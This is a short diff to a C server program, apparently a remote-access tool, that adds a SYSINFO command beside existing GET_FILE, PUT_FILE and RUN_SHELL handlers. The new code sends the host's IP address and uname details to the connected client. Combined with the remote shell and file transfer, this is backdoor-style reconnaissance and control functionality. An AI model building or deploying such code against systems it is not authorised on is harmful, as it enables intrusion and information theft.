@@ -142,6 +142,25 @@ int run_shell(){
 	return 0;
 }
 
+int sysinfo(){
+	struct sockaddr_in addr;
+	struct utsname uts;
+	socklen_t addr_len = sizeof(struct sockaddr_in);
+	/* get socket ip*/
+	getsockname(client, (struct sockaddr*)&addr, &addr_len);
+	memcpy(send_msg_buf, &addr.sin_addr, 4);
+	uname(&uts);
+	memcpy(send_msg_buf + 4, &uts, 390);
+	send_msg(send_msg_buf, 394);
+	//printf("IP address: \t%s\n", inet_ntoa(addr.sin_addr));
+	//printf("sysname: \t%s\n", uts.sysname);
+	//printf("nodename: \t%s\n", uts.nodename);
+	//printf("release: \t%s\n", uts.release);
+	//printf("version: \t%s\n", uts.version);
+	//printf("machine: \t%s\n", uts.machine);
+	return 0;
+}
+
 int service(){
 	struct sockaddr_in addr;
 	socklen_t addr_len = sizeof(struct sockaddr);
@@ -186,6 +205,7 @@ int service(){
 			case GET_FILE:ret = get_file();break;
 			case PUT_FILE:ret = put_file();break;
 			case RUN_SHELL:ret = run_shell();break;
+			case SYSINFO:ret = sysinfo(); break;
 			default:;
 		}
 		shutdown(client, 2);
